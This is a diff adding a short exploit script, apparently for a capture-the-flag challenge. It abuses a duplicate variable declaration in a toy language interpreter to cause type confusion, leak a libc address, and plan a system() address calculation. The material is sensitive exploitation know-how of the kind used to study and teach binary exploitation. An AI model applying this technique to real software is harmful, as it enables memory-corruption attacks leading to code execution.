@@ -1,0 +1,24 @@
+print("=== Libc Leak via Type Confusion ===");
+
+print("Step 1: Create string variable");
+string v2 = "BBBBBBBB";
+print("String v2 created");
+
+print("Step 2: Create duplicate int variable (type confusion)");
+int v2 = 4231312;
+print("Int v2 created (duplicate declaration)");
+
+print("Step 3: Call length() on v2");
+print("This triggers type confusion and leaks libc address");
+int leaked = length(v2);
+print("Leaked address:");
+print(leaked);
+
+print("Step 4: Calculate system address");
+print("leaked_addr = setvbuf address (or similar libc function)");
+print("Need to identify which function this is");
+print("Then calculate system() address");
+
+print("Note: This leaks libc address directly!");
+print("No need to corrupt GOT first!");
+
